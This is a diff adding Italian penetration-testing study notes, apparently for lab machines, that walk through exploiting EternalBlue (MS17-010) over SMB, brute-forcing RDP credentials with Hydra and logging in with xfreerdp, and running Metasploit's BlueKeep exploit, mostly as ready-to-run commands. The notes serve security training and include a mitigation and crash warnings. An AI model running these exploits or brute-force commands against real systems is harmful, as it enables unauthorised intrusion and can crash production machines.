@@ -145,3 +145,122 @@ exploit
 {% hint style="info" %}
 **NB: In questo caso viene caricato un file (payload) sul target quindi potrebbe essere individuato, mentre via PsExec non lasciamo traccia**
 {% endhint %}
+
+### Exploiting EternalBlue (MS17-010) - SMB
+
+<figure><img src="../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>
+
+#### Scan Nmap per vedere OS e porta SMB
+
+```
+sudo nmap -sV -p 445 -O 10.10.10.12
+```
+
+#### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue
+
+```
+sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
+```
+
+#### Per verificare se è vulnerabile
+
+è possibile utilizzare questo modulo auxiliary:
+
+```
+use auxiliary/scanner/smb/smb_ms17_010
+```
+
+#### Exploit manuale con AutoBlue-MS17-010
+
+Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.
+
+{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}
+
+#### Exploit automatico con Metasploit Framework
+
+```
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.12 //target IP
+exploit
+```
+
+### Exploiting RDP
+
+#### Scan porte con modulo MSF
+
+```
+msfconsole
+search rdp_scanner
+use auxiliary/scanner/rdp/rdp_scanner
+show options
+set RHOSTS 10.2.24.86
+set RPORT 3333 //la porta che ipotizziamo abbia aperto il servizio RDP
+run
+```
+
+#### Hydra: Bruteforce a RDP per trovare le credenziali
+
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-frameworj/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
+// dove 3333 è la porta RDP, se non la specifichiamo con -s hydra assume la porta di default
+```
+
+{% hint style="info" %}
+ATTENZIONE: regolare la brute force speed in casi reali usando -t 2 or-t 3
+{% endhint %}
+
+#### Autenticarci via RDP (connetterci con xfreerdp)
+
+```
+xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
+// confermiamo con YES che ci fidiamo del certificato
+```
+
+### BlueKeep (CVE-2019-0708) - RDP
+
+<figure><img src="../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>
+
+Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.
+
+{% hint style="info" %}
+**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**
+{% endhint %}
+
+#### Test porta RDP 3389 aperta
+
+```
+sudo nmap -p 3389 10.10.10.7
+```
+
+#### Verifica se target è vulnerabile con modulo MSF
+
+```
+msfconsole
+search BlueKeep
+use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS <IP target>
+run
+```
+
+#### Esecuzione exploit su target vulnerabile
+
+```
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+show options
+set RHOSTS 10.10.10.7
+show targets
+set target 2
+```
+
+è uno staged payload, e funziona solo su Windows a 64 bit.
+
+Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.
+
+Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.
+
+{% hint style="info" %}
+**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**
+{% endhint %}
+
